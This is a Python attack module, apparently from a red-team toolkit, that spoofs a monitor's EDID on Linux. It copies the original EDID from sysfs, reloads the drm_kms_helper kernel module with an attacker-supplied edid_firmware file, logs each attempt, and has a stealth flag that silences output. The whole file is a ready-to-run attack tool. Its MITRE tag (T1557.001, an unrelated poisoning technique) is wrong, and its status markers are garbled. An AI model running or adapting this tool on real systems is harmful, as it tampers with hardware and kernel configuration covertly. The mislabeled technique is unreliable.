# modules/attacks/edid_spoofer.py

import subprocess
import argparse
import json
import os
import time
from datetime import datetime

LOG_FILE = "results/edid_spoof_logs.json"
MITRE_TTP = "T1557.001"

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def backup_original_edid(device):
    try:
        orig_path = f"/sys/class/drm/{device}/edid"
        backup_path = f"/tmp/{device}_edid.bak"
        subprocess.run(["cp", orig_path, backup_path], check=True)
        return backup_path
    except Exception as e:
        print(f"[!] Failed to backup EDID: {e}")
        return None

def inject_edid(device, edid_bin):
    try:
        subprocess.run(["modprobe", "-r", "drm_kms_helper"], check=True)
        subprocess.run(["modprobe", "drm_kms_helper", f"edid_firmware={device}:{edid_bin}"], check=True)
        print(f"[â] EDID injected for {device}")
        return True
    except Exception as e:
        print(f"[!] Injection failed: {e}")
        return False

def spoof_edid(device, spoof_file, stealth=False):
    ts = datetime.utcnow().isoformat()
    backup_path = backup_original_edid(device)
    success = inject_edid(device, spoof_file)

    log_entry = {
        "timestamp": ts,
        "device": device,
        "spoof_file": spoof_file,
        "success": success,
        "backup": backup_path,
        "ttp": MITRE_TTP,
        "stealth": stealth
    }
    log_event(log_entry)

    if not stealth:
        print(f"[â] Spoofing complete. Log written.")

def main():
    parser = argparse.ArgumentParser(description="EDID Spoofing Attack Module")
    parser.add_argument("--device", required=True, help="DRM device (e.g., card0-HDMI-A-1)")
    parser.add_argument("--spoof", required=True, help="Spoofed EDID .bin file path")
    parser.add_argument("--stealth", action="store_true", help="Suppress output")
    args = parser.parse_args()

    if args.stealth:
        import sys
        sys.stdout = open(os.devnull, 'w')

    spoof_edid(args.device, args.spoof, args.stealth)

if __name__ == "__main__":
    main()
